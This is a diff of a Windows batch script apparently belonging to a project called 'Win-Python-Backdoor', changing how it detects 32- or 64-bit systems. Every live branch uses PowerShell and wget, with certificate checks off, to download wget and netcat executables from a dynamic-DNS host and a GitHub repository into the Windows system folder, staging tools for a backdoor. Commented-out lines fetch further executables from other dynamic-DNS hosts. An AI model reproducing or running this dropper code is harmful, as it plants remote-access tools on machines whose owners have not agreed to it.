@@ -35,14 +35,15 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
 set url=http://config02.addns.org
 set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
-if "%PROCESSOR_ARCHITECTURE%"=="AMD64" goto 64BIT
-%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')
-wget --no-check-certificate %urlgit%/nc.exe  -O %windir%\nc64.exe
-goto END
-:64BIT
+if "%PROCESSOR_ARCHITECTURE%"=="x86" goto 32BIT
 echo 64-bit OS
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')
 wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
+goto END
+:32BIT
+echo 32-bit OS
+%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')
+wget --no-check-certificate %urlgit%/nc.exe  -O %windir%\nc64.exe
 :END
 
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wofficeie1.exe','%windir%\wofficeie1.exe')
